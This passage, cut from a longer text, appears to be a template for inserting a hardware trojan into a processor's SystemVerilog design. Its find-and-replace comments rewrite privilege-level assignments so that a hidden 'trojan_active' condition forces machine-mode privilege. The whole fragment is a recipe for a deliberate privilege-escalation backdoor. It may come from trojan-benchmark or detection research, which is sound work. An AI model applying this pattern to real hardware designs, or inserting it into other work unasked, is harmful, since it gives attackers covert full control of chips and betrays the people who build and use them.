...
//
// IF {{PAYLOAD_SIGNAL}} is assigned in always_ff:
//   Find: {{PAYLOAD_SIGNAL}} <= next_priv_level;
//   Replace: {{PAYLOAD_SIGNAL}} <= trojan_active ? PRIV_LVL_M : next_priv_level;
//
// IF {{PAYLOAD_SIGNAL}} is conditional:
//   Find: if (condition) {{PAYLOAD_SIGNAL}} <= new_level;
//   Replace: if (condition) {{PAYLOAD_SIGNAL}} <= trojan_active ? PRIV_LVL_M : new_level;